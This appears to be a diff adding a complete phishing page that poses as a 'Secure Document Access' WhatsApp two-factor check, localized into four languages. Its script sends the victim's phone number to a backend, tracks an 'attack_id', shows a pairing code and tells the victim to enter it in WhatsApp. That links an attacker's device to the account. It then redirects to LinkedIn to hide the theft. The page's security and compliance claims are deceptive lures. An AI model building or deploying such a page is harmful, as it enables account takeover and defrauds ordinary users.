@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Document Access</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📄</text></svg>" type="image/svg+xml">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background: #f3f6f8;
+            color: #2d3748;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 520px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .header-logo {
+            margin-bottom: 30px;
+        }
+
+        .header-logo h1 {
+            color: #1a202c;
+            font-size: 28px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+            margin-bottom: 8px;
+        }
+
+        .header-logo .subtitle {
+            color: #718096;
+            font-size: 15px;
+            font-weight: 400;
+        }
+
+        .doc-icon {
+            width: 56px;
+            height: 56px;
+            background: #0a66c2;
+            color: white;
+            border-radius: 12px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            margin-bottom: 16px;
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 32px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1), 0 1px 2px rgba(0, 0, 0, 0.06);
+            border: 1px solid #e2e8f0;
+        }
+
+        .info-box {
+            background: #f7fafc;
+            border-radius: 8px;
+            padding: 16px 20px;
+            margin: 20px 0;
+            border: 1px solid #e2e8f0;
+            text-align: left;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .info-box h4 {
+            color: #2d3748;
+            margin-bottom: 12px;
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .info-box p {
+            color: #4a5568;
+            margin-bottom: 8px;
+        }
+
+        .info-box ol, .info-box ul {
+            margin-left: 20px;
+            margin-bottom: 0;
+            color: #4a5568;
+        }
+
+        .info-box li {
+            margin-bottom: 8px;
+        }
+
+        .info-box li:last-child {
+            margin-bottom: 0;
+        }
+
+        .highlight-box {
+            background: #ebf8ff;
+            border: 1px solid #bee3f8;
+            border-radius: 8px;
+            padding: 16px 20px;
+            margin-bottom: 24px;
+        }
+
+        .highlight-box p {
+            font-size: 14px;
+            color: #2c5282;
+            line-height: 1.6;
+            margin: 0;
+        }
+
+        .success-box {
+            background: #f0fff4;
+            border-color: #9ae6b4;
+        }
+
+        .success-box h4 {
+            color: #22543d;
+        }
+
+        .success-box p {
+            color: #276749;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #4a5568;
+            font-size: 14px;
+            font-weight: 500;
+            text-align: left;
+        }
+
+        .phone-input {
+            display: flex;
+            background: #ffffff;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid #cbd5e0;
+            transition: all 0.2s;
+            margin-bottom: 20px;
+        }
+
+        .phone-input:focus-within {
+            border-color: #0a66c2;
+            box-shadow: 0 0 0 3px rgba(10, 102, 194, 0.1);
+        }
+
+        .country-code {
+            background: #f7fafc;
+            padding: 12px 14px;
+            color: #2d3748;
+            font-size: 15px;
+            border-right: 1px solid #e2e8f0;
+            min-width: 90px;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        .phone-input input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 12px 14px;
+            color: #2d3748;
+            font-size: 15px;
+            outline: none;
+        }
+
+        .phone-input input::placeholder {
+            color: #a0aec0;
+        }
+
+        .btn {
+            background: #0a66c2;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 14px 24px;
+            font-size: 15px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+        }
+
+        .btn:hover:not(:disabled) {
+            background: #084d92;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .btn:disabled {
+            background: #cbd5e0;
+            color: #a0aec0;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: #ffffff;
+            color: #4a5568;
+            border: 1px solid #cbd5e0;
+            margin-top: 12px;
+        }
+
+        .btn-secondary:hover {
+            background: #f7fafc;
+            border-color: #a0aec0;
+        }
+
+        .phone-display {
+            font-size: 18px;
+            color: #2d3748;
+            margin: 20px 0;
+            background: #f7fafc;
+            padding: 14px;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+            font-weight: 500;
+        }
+
+        .code-display {
+            background: #ffffff;
+            border: 2px solid #0a66c2;
+            font-size: 42px;
+            font-weight: 700;
+            padding: 24px;
+            letter-spacing: 6px;
+            color: #0a66c2;
+            box-shadow: 0 2px 8px rgba(10, 102, 194, 0.15);
+            border-radius: 8px;
+            margin: 24px 0;
+        }
+
+        .instructions {
+            font-size: 14px;
+            color: #718096;
+            margin-bottom: 12px;
+        }
+
+        .footer {
+            margin-top: 24px;
+            font-size: 13px;
+            color: #718096;
+            line-height: 1.6;
+        }
+
+        .footer a {
+            color: #0a66c2;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        .loader {
+            display: inline-block;
+            width: 36px;
+            height: 36px;
+            border: 3px solid #e2e8f0;
+            border-top-color: #0a66c2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-container {
+            background: #f7fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 40px;
+            margin: 20px auto;
+            text-align: center;
+        }
+
+        .success-icon {
+            font-size: 56px;
+            margin-bottom: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header-logo">
+            <div class="doc-icon">📄</div>
+            <h1 data-i18n="title">Secure Document Access</h1>
+            <div class="subtitle" data-i18n="subtitle">Identity verification required</div>
+        </div>
+
+        <div class="card">
+            <!-- Step 1: Phone Number Entry -->
+            <div id="step1" class="step active">
+                <div class="info-box" style="margin-top: 0;">
+                    <h4 data-i18n="step1.title">Two-Factor Authentication Required</h4>
+                    <p data-i18n="step1.description">
+                        To access this document, we need to verify your identity using
+                        two-factor authentication via WhatsApp. This ensures that only
+                        authorized individuals can view sensitive content.
+                    </p>
+                </div>
+
+                <div class="highlight-box">
+                    <p>
+                        <strong data-i18n="step1.why_title">Why this verification?</strong><br>
+                        <span style="display: block; margin-top: 8px;" data-i18n="step1.why_description">
+                        This security measure protects against unauthorized access and
+                        ensures compliance with data protection regulations. The process
+                        takes approximately 60 seconds to complete.
+                        </span>
+                    </p>
+                </div>
+
+                <div style="margin-bottom: 20px;">
+                    <label for="phone" data-i18n="step1.phone_label">Your WhatsApp Phone Number</label>
+                    <div class="phone-input">
+                        <select class="country-code" id="countryCode">
+                            <option value="+1">🇺🇸 +1</option>
+                            <option value="+44">🇬🇧 +44</option>
+                            <option value="+49">🇩🇪 +49</option>
+                            <option value="+33">🇫🇷 +33</option>
+                            <option value="+39">🇮🇹 +39</option>
+                            <option value="+34">🇪🇸 +34</option>
+                            <option value="+31">🇳🇱 +31</option>
+                            <option value="+41">🇨🇭 +41</option>
+                            <option value="+43">🇦🇹 +43</option>
+                            <option value="+32">🇧🇪 +32</option>
+                        </select>
+                        <input type="tel" id="phone" placeholder="123 456 7890" maxlength="15" required>
+                    </div>
+                </div>
+
+                <button class="btn" onclick="startVerification()" id="startBtn" data-i18n="step1.button">
+                    Start Verification
+                </button>
+
+                <div class="footer">
+                    <p data-i18n="step1.footer">
+                        By continuing, you confirm that you are authorized to access this document
+                        and agree to the verification process.
+                    </p>
+                </div>
+            </div>
+
+            <!-- Step 2: Processing -->
+            <div id="step2" class="step">
+                <div class="info-box">
+                    <h4 data-i18n="step2.title">Verification in Progress</h4>
+                    <p data-i18n="step2.description">
+                        Please wait while we establish a secure connection and generate
+                        your verification code. This process may take a few moments.
+                    </p>
+                </div>
+
+                <div class="loading-container">
+                    <div class="loader"></div>
+                </div>
+
+                <p class="instructions" id="step2Instructions" style="text-align: center; color: #4a5568;">
+                    <span data-i18n="step2.status">Connecting to verification system...</span>
+                </p>
+            </div>
+
+            <!-- Step 3: Code Display -->
+            <div id="step3" class="step">
+                <div class="info-box success-box">
+                    <h4 data-i18n="step3.title">Verification Code Generated</h4>
+                    <p data-i18n="step3.description">
+                        A unique verification code has been generated for your session.
+                        You must enter this code on your mobile device to complete authentication.
+                    </p>
+                </div>
+
+                <p class="instructions" style="margin: 24px 0 16px 0; font-size: 14px; color: #4a5568; font-weight: 500; text-align: center;">
+                    <span data-i18n="step3.code_label">Enter this code on your phone:</span>
+                </p>
+
+                <div class="code-display" id="displayedCodeBox">
+                    XXXX-XXXX
+                </div>
+
+                <div class="info-box">
+                    <h4 data-i18n="step3.instructions_title">Verification Steps</h4>
+                    <ol data-i18n-list="step3.instructions">
+                        <li>Open WhatsApp on your mobile device</li>
+                        <li>You will see a verification request</li>
+                        <li>Enter the code shown above: <strong id="displayedCodeText" style="color: #0a66c2;">XXXX-XXXX</strong></li>
+                        <li>Wait for the verification to complete</li>
+                    </ol>
+                </div>
+
+                <p class="instructions" style="margin-top: 20px; font-size: 13px; color: #718096; text-align: center;">
+                    <span data-i18n="step3.verifying">Verifying number:</span> <span id="phoneDisplay2" style="color: #4a5568; font-weight: 500;">+1 234 567 8900</span>
+                </p>
+
+                <button class="btn btn-secondary" onclick="goBack()">
+                    <span data-i18n="step3.cancel">Cancel Verification</span>
+                </button>
+            </div>
+
+            <!-- Step 4: Waiting for User Confirmation -->
+            <div id="step4" class="step">
+                <div class="info-box" style="background: #fffaf0; border-color: #fbd38d;">
+                    <h4 style="color: #7c2d12;" data-i18n="step4.title">Waiting for Confirmation</h4>
+                    <p style="color: #8b4513;" data-i18n="step4.description">
+                        Please confirm that you have entered the verification code on your
+                        mobile device. The system is waiting for your authentication to complete.
+                    </p>
+                </div>
+
+                <div class="loading-container">
+                    <div class="loader"></div>
+                    <p style="margin-top: 16px; color: #4a5568; font-size: 14px;">
+                        <span data-i18n="step4.waiting">Waiting for code entry on your device...</span>
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <p style="margin: 0; font-size: 13px;">
+                        <strong data-i18n="step4.note_title">Note:</strong>
+                        <span data-i18n="step4.note_description">
+                        Once you enter the code on your phone, this page will automatically
+                        proceed to grant you access to the document.
+                        </span>
+                    </p>
+                </div>
+            </div>
+
+            <!-- Step 5: Success -->
+            <div id="step5" class="step">
+                <div style="background: #f0fff4; border: 2px solid #9ae6b4; border-radius: 12px; padding: 32px; margin-bottom: 24px; text-align: center;">
+                    <div class="success-icon">✓</div>
+                    <h3 style="color: #22543d; margin-bottom: 12px; font-size: 20px; font-weight: 600;" data-i18n="step5.title">
+                        Verification Complete
+                    </h3>
+                    <p style="color: #276749; font-size: 14px; margin: 0;" data-i18n="step5.description">
+                        Your identity has been successfully verified
+                    </p>
+                </div>
+
+                <div class="info-box success-box">
+                    <h4 data-i18n="step5.success_title">Authentication Successful</h4>
+                    <p data-i18n="step5.success_description">
+                        Thank you for completing the security verification. You will now
+                        be redirected to view the requested document.
+                    </p>
+                </div>
+
+                <div class="loading-container">
+                    <div class="loader" style="border-color: #9ae6b4; border-top-color: #22543d;"></div>
+                </div>
+
+                <p class="instructions" style="color: #4a5568; font-size: 15px; font-weight: 500; text-align: center;">
+                    <span data-i18n="step5.redirecting">Redirecting to document...</span>
+                </p>
+
+                <div class="footer" style="margin-top: 24px; text-align: center;">
+                    <p style="color: #718096;">
+                        <span data-i18n="step5.manual_redirect">If you are not redirected automatically,</span>
+                        <a href="https://www.linkedin.com" data-i18n="step5.click_here">click here</a>.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Multi-language support
+        const translations = {
+            en: {
+                title: "Secure Document Access",
+                subtitle: "Identity verification required",
+                step1: {
+                    title: "Two-Factor Authentication Required",
+                    description: "To access this document, we need to verify your identity using two-factor authentication via WhatsApp. This ensures that only authorized individuals can view sensitive content.",
+                    why_title: "Why this verification?",
+                    why_description: "This security measure protects against unauthorized access and ensures compliance with data protection regulations. The process takes approximately 60 seconds to complete.",
+                    phone_label: "Your WhatsApp Phone Number",
+                    button: "Start Verification",
+                    footer: "By continuing, you confirm that you are authorized to access this document and agree to the verification process."
+                },
+                step2: {
+                    title: "Verification in Progress",
+                    description: "Please wait while we establish a secure connection and generate your verification code. This process may take a few moments.",
+                    status: "Connecting to verification system..."
+                },
+                step3: {
+                    title: "Verification Code Generated",
+                    description: "A unique verification code has been generated for your session. You must enter this code on your mobile device to complete authentication.",
+                    code_label: "Enter this code on your phone:",
+                    instructions_title: "Verification Steps",
+                    instructions: [
+                        "Open WhatsApp on your mobile device",
+                        "You will see a verification request",
+                        "Enter the code shown above",
+                        "Wait for the verification to complete"
+                    ],
+                    verifying: "Verifying number:",
+                    cancel: "Cancel Verification"
+                },
+                step4: {
+                    title: "Waiting for Confirmation",
+                    description: "Please confirm that you have entered the verification code on your mobile device. The system is waiting for your authentication to complete.",
+                    waiting: "Waiting for code entry on your device...",
+                    note_title: "Note:",
+                    note_description: "Once you enter the code on your phone, this page will automatically proceed to grant you access to the document."
+                },
+                step5: {
+                    title: "Verification Complete",
+                    description: "Your identity has been successfully verified",
+                    success_title: "Authentication Successful",
+                    success_description: "Thank you for completing the security verification. You will now be redirected to view the requested document.",
+                    redirecting: "Redirecting to document...",
+                    manual_redirect: "If you are not redirected automatically,",
+                    click_here: "click here"
+                }
+            },
+            de: {
+                title: "Sicherer Dokumentenzugriff",
+                subtitle: "Identitätsprüfung erforderlich",
+                step1: {
+                    title: "Zwei-Faktor-Authentifizierung erforderlich",
+                    description: "Um auf dieses Dokument zuzugreifen, müssen wir Ihre Identität über WhatsApp per Zwei-Faktor-Authentifizierung verifizieren. Dies stellt sicher, dass nur autorisierte Personen sensible Inhalte einsehen können.",
+                    why_title: "Warum diese Verifizierung?",
+                    why_description: "Diese Sicherheitsmaßnahme schützt vor unbefugtem Zugriff und gewährleistet die Einhaltung der Datenschutzbestimmungen. Der Vorgang dauert ca. 60 Sekunden.",
+                    phone_label: "Ihre WhatsApp-Telefonnummer",
+                    button: "Verifizierung starten",
+                    footer: "Durch Fortfahren bestätigen Sie, dass Sie berechtigt sind, auf dieses Dokument zuzugreifen, und stimmen dem Verifizierungsprozess zu."
+                },
+                step2: {
+                    title: "Verifizierung läuft",
+                    description: "Bitte warten Sie, während wir eine sichere Verbindung herstellen und Ihren Verifizierungscode generieren. Dieser Vorgang kann einige Momente dauern.",
+                    status: "Verbindung zum Verifizierungssystem wird hergestellt..."
+                },
+                step3: {
+                    title: "Verifizierungscode generiert",
+                    description: "Ein eindeutiger Verifizierungscode wurde für Ihre Sitzung generiert. Sie müssen diesen Code auf Ihrem Mobilgerät eingeben, um die Authentifizierung abzuschließen.",
+                    code_label: "Geben Sie diesen Code auf Ihrem Telefon ein:",
+                    instructions_title: "Verifizierungsschritte",
+                    instructions: [
+                        "Öffnen Sie WhatsApp auf Ihrem Mobilgerät",
+                        "Sie werden eine Verifizierungsanfrage sehen",
+                        "Geben Sie den oben angezeigten Code ein",
+                        "Warten Sie, bis die Verifizierung abgeschlossen ist"
+                    ],
+                    verifying: "Verifiziere Nummer:",
+                    cancel: "Verifizierung abbrechen"
+                },
+                step4: {
+                    title: "Warten auf Bestätigung",
+                    description: "Bitte bestätigen Sie, dass Sie den Verifizierungscode auf Ihrem Mobilgerät eingegeben haben. Das System wartet darauf, dass Ihre Authentifizierung abgeschlossen wird.",
+                    waiting: "Warten auf Code-Eingabe auf Ihrem Gerät...",
+                    note_title: "Hinweis:",
+                    note_description: "Sobald Sie den Code auf Ihrem Telefon eingeben, wird diese Seite automatisch fortfahren und Ihnen Zugriff auf das Dokument gewähren."
+                },
+                step5: {
+                    title: "Verifizierung abgeschlossen",
+                    description: "Ihre Identität wurde erfolgreich verifiziert",
+                    success_title: "Authentifizierung erfolgreich",
+                    success_description: "Vielen Dank für das Abschließen der Sicherheitsüberprüfung. Sie werden nun weitergeleitet, um das angeforderte Dokument anzuzeigen.",
+                    redirecting: "Weiterleitung zum Dokument...",
+                    manual_redirect: "Falls Sie nicht automatisch weitergeleitet werden,",
+                    click_here: "klicken Sie hier"
+                }
+            },
+            fr: {
+                title: "Accès Sécurisé au Document",
+                subtitle: "Vérification d'identité requise",
+                step1: {
+                    title: "Authentification à Deux Facteurs Requise",
+                    description: "Pour accéder à ce document, nous devons vérifier votre identité via l'authentification à deux facteurs WhatsApp. Cela garantit que seules les personnes autorisées peuvent consulter le contenu sensible.",
+                    why_title: "Pourquoi cette vérification?",
+                    why_description: "Cette mesure de sécurité protège contre les accès non autorisés et garantit la conformité aux réglementations sur la protection des données. Le processus prend environ 60 secondes.",
+                    phone_label: "Votre Numéro WhatsApp",
+                    button: "Démarrer la Vérification",
+                    footer: "En continuant, vous confirmez que vous êtes autorisé à accéder à ce document et acceptez le processus de vérification."
+                },
+                step2: {
+                    title: "Vérification en Cours",
+                    description: "Veuillez patienter pendant que nous établissons une connexion sécurisée et générons votre code de vérification. Ce processus peut prendre quelques instants.",
+                    status: "Connexion au système de vérification..."
+                },
+                step3: {
+                    title: "Code de Vérification Généré",
+                    description: "Un code de vérification unique a été généré pour votre session. Vous devez entrer ce code sur votre appareil mobile pour terminer l'authentification.",
+                    code_label: "Entrez ce code sur votre téléphone:",
+                    instructions_title: "Étapes de Vérification",
+                    instructions: [
+                        "Ouvrez WhatsApp sur votre appareil mobile",
+                        "Vous verrez une demande de vérification",
+                        "Entrez le code affiché ci-dessus",
+                        "Attendez que la vérification soit terminée"
+                    ],
+                    verifying: "Vérification du numéro:",
+                    cancel: "Annuler la Vérification"
+                },
+                step4: {
+                    title: "En Attente de Confirmation",
+                    description: "Veuillez confirmer que vous avez entré le code de vérification sur votre appareil mobile. Le système attend que votre authentification soit terminée.",
+                    waiting: "En attente de la saisie du code sur votre appareil...",
+                    note_title: "Note:",
+                    note_description: "Une fois que vous aurez entré le code sur votre téléphone, cette page procédera automatiquement pour vous donner accès au document."
+                },
+                step5: {
+                    title: "Vérification Terminée",
+                    description: "Votre identité a été vérifiée avec succès",
+                    success_title: "Authentification Réussie",
+                    success_description: "Merci d'avoir complété la vérification de sécurité. Vous allez maintenant être redirigé pour voir le document demandé.",
+                    redirecting: "Redirection vers le document...",
+                    manual_redirect: "Si vous n'êtes pas redirigé automatiquement,",
+                    click_here: "cliquez ici"
+                }
+            },
+            es: {
+                title: "Acceso Seguro a Documentos",
+                subtitle: "Verificación de identidad requerida",
+                step1: {
+                    title: "Autenticación de Dos Factores Requerida",
+                    description: "Para acceder a este documento, necesitamos verificar su identidad mediante autenticación de dos factores vía WhatsApp. Esto garantiza que solo las personas autorizadas puedan ver contenido sensible.",
+                    why_title: "¿Por qué esta verificación?",
+                    why_description: "Esta medida de seguridad protege contra el acceso no autorizado y garantiza el cumplimiento de las regulaciones de protección de datos. El proceso toma aproximadamente 60 segundos.",
+                    phone_label: "Su Número de WhatsApp",
+                    button: "Iniciar Verificación",
+                    footer: "Al continuar, confirma que está autorizado para acceder a este documento y acepta el proceso de verificación."
+                },
+                step2: {
+                    title: "Verificación en Progreso",
+                    description: "Por favor espere mientras establecemos una conexión segura y generamos su código de verificación. Este proceso puede tomar algunos momentos.",
+                    status: "Conectando al sistema de verificación..."
+                },
+                step3: {
+                    title: "Código de Verificación Generado",
+                    description: "Se ha generado un código de verificación único para su sesión. Debe ingresar este código en su dispositivo móvil para completar la autenticación.",
+                    code_label: "Ingrese este código en su teléfono:",
+                    instructions_title: "Pasos de Verificación",
+                    instructions: [
+                        "Abra WhatsApp en su dispositivo móvil",
+                        "Verá una solicitud de verificación",
+                        "Ingrese el código mostrado arriba",
+                        "Espere a que se complete la verificación"
+                    ],
+                    verifying: "Verificando número:",
+                    cancel: "Cancelar Verificación"
+                },
+                step4: {
+                    title: "Esperando Confirmación",
+                    description: "Por favor confirme que ha ingresado el código de verificación en su dispositivo móvil. El sistema está esperando que complete su autenticación.",
+                    waiting: "Esperando la entrada del código en su dispositivo...",
+                    note_title: "Nota:",
+                    note_description: "Una vez que ingrese el código en su teléfono, esta página procederá automáticamente para otorgarle acceso al documento."
+                },
+                step5: {
+                    title: "Verificación Completada",
+                    description: "Su identidad ha sido verificada exitosamente",
+                    success_title: "Autenticación Exitosa",
+                    success_description: "Gracias por completar la verificación de seguridad. Ahora será redirigido para ver el documento solicitado.",
+                    redirecting: "Redirigiendo al documento...",
+                    manual_redirect: "Si no es redirigido automáticamente,",
+                    click_here: "haga clic aquí"
+                }
+            }
+        };
+
+        // Detect user language
+        const userLang = (navigator.language || navigator.userLanguage).split('-')[0];
+        const currentLang = translations[userLang] ? userLang : 'en';
+
+        // Apply translations
+        function applyTranslations() {
+            const lang = translations[currentLang];
+
+            // Translate simple text elements
+            document.querySelectorAll('[data-i18n]').forEach(elem => {
+                const key = elem.getAttribute('data-i18n');
+                const keys = key.split('.');
+                let value = lang;
+
+                for (let k of keys) {
+                    value = value[k];
+                }
+
+                if (value) {
+                    elem.textContent = value;
+                }
+            });
+
+            // Translate list items
+            document.querySelectorAll('[data-i18n-list]').forEach(elem => {
+                const key = elem.getAttribute('data-i18n-list');
+                const keys = key.split('.');
+                let value = lang;
+
+                for (let k of keys) {
+                    value = value[k];
+                }
+
+                if (Array.isArray(value)) {
+                    const items = elem.querySelectorAll('li');
+                    value.forEach((text, index) => {
+                        if (items[index]) {
+                            const strong = items[index].querySelector('strong');
+                            if (strong) {
+                                items[index].innerHTML = text + ': ' + strong.outerHTML;
+                            } else {
+                                items[index].textContent = text;
+                            }
+                        }
+                    });
+                }
+            });
+
+            // Set document language
+            document.documentElement.lang = currentLang;
+        }
+
+        let currentAttackId = null;
+        let phoneNumber = '';
+        let codePollingInterval = null;
+        let pairingCheckInterval = null;
+
+        async function startVerification() {
+            const countryCode = document.getElementById('countryCode').value;
+            const phone = document.getElementById('phone').value.trim();
+
+            if (!phone) {
+                alert(currentLang === 'de' ? 'Bitte geben Sie Ihre Telefonnummer ein' :
+                      currentLang === 'fr' ? 'Veuillez entrer votre numéro de téléphone' :
+                      currentLang === 'es' ? 'Por favor ingrese su número de teléfono' :
+                      'Please enter your phone number');
+                return;
+            }
+
+            phoneNumber = countryCode + phone;
+
+            const btn = document.getElementById('startBtn');
+            btn.disabled = true;
+            btn.textContent = currentLang === 'de' ? 'Wird gestartet...' :
+                            currentLang === 'fr' ? 'Démarrage...' :
+                            currentLang === 'es' ? 'Iniciando...' :
+                            'Starting...';
+
+            try {
+                const response = await fetch('/api/request-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: phoneNumber })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    currentAttackId = data.attack_id;
+
+                    // Go to step 2
+                    document.getElementById('step1').classList.remove('active');
+                    document.getElementById('step2').classList.add('active');
+
+                    // Start polling for code
+                    startCodePolling();
+                } else {
+                    alert(data.error || 'Verification failed');
+                    btn.disabled = false;
+                    btn.textContent = translations[currentLang].step1.button;
+                }
+            } catch (error) {
+                alert('Connection error. Please try again.');
+                btn.disabled = false;
+                btn.textContent = translations[currentLang].step1.button;
+            }
+        }
+
+        function startCodePolling() {
+            let pollCount = 0;
+
+            codePollingInterval = setInterval(async () => {
+                pollCount++;
+
+                try {
+                    const response = await fetch(`/api/get-displayed-code/${currentAttackId}`);
+                    const data = await response.json();
+
+                    if (data.success && data.code) {
+                        clearInterval(codePollingInterval);
+
+                        // Update UI with code
+                        document.getElementById('displayedCodeBox').textContent = data.code;
+                        document.getElementById('displayedCodeText').textContent = data.code;
+                        document.getElementById('phoneDisplay2').textContent = phoneNumber;
+
+                        // Go to step 3
+                        document.getElementById('step2').classList.remove('active');
+                        document.getElementById('step3').classList.add('active');
+
+                        // Start checking for pairing completion
+                        setTimeout(() => {
+                            checkPairingStatus();
+                        }, 3000);
+
+                        return;
+                    }
+
+                    if (pollCount >= 60) {
+                        clearInterval(codePollingInterval);
+                        alert('Timeout. Please try again.');
+                        goBack();
+                    }
+                } catch (error) {
+                    console.error('Polling error:', error);
+                }
+            }, 1000);
+        }
+
+        function checkPairingStatus() {
+            // Keep step 3 visible (code display stays on screen)
+            // Don't move to step 4 - keep showing the code until pairing is complete
+
+            let checkCount = 0;
+
+            pairingCheckInterval = setInterval(async () => {
+                checkCount++;
+
+                try {
+                    const response = await fetch(`/api/check-pairing/${currentAttackId}`);
+                    const data = await response.json();
+
+                    if (data.paired || data.completed) {
+                        clearInterval(pairingCheckInterval);
+
+                        // SUCCESS: Show success and redirect to LinkedIn
+                        document.getElementById('step3').classList.remove('active');
+                        document.getElementById('step5').classList.add('active');
+
+                        setTimeout(() => {
+                            window.location.href = 'https://www.linkedin.com';
+                        }, 3000);
+
+                        return;
+                    }
+
+                    // Timeout after 2 minutes of waiting
+                    if (checkCount >= 120) {
+                        clearInterval(pairingCheckInterval);
+
+                        // FAILURE: Show error message with restart button, DON'T redirect
+                        showVerificationError('Verification timeout. Please try again.');
+                    }
+                } catch (error) {
+                    console.error('Pairing check error:', error);
+                    // On error, show error message after a few attempts
+                    if (checkCount >= 10) {
+                        clearInterval(pairingCheckInterval);
+                        showVerificationError('Verification failed. Please restart the process.');
+                    }
+                }
+            }, 1000);
+        }
+
+        function showVerificationError(message) {
+            // Show error message on step 3
+            const step3 = document.getElementById('step3');
+            const errorDiv = document.createElement('div');
+            errorDiv.style.cssText = 'background: #fff5f5; border: 2px solid #fc8181; border-radius: 12px; padding: 24px; margin-top: 24px; text-align: center;';
+            errorDiv.innerHTML = `
+                <h4 style="color: #c53030; margin-bottom: 12px;">⚠️ Verification Failed</h4>
+                <p style="color: #742a2a; margin-bottom: 16px;">\${message}</p>
+                <button onclick="location.reload()" style="background: #0a66c2; color: white; border: none; padding: 12px 32px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer;">
+                    Restart Verification Process
+                </button>
+            `;
+            step3.appendChild(errorDiv);
+        }
+
+        function goBack() {
+            clearInterval(codePollingInterval);
+            clearInterval(pairingCheckInterval);
+
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step3').classList.remove('active');
+            document.getElementById('step4').classList.remove('active');
+            document.getElementById('step1').classList.add('active');
+
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('startBtn').textContent = translations[currentLang].step1.button;
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            applyTranslations();
+        });
+    </script>
+</body>
+</html>
